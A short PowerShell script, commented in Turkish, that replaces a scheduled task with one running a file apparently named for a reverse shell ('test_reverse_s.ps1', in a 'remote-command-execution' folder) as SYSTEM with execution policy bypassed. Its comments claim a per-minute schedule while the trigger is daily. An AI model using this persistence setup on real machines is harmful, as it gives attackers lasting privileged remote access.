# Görev adını belirleyin
$taskName = "PowerShell Script Task"

# Var olan görevi sil
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false

# Görev için gerekli aksiyonu tanımlayın
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Users\Admin\remote-command-execution\test_reverse_s.ps1"

# Görev tetikleyicisini oluşturun (Her dakika çalışacak şekilde)
$Trigger = New-ScheduledTaskTrigger -Daily -At "00:00AM" # Burada saati seçebilirsiniz, örneğin: her gün 00:00'da başlasın.

# Görev başlatan kullanıcı bilgilerini ayarlayın
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

# Görevi kaydedin
Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -TaskName $taskName -Description "Runs the PowerShell script every minute"
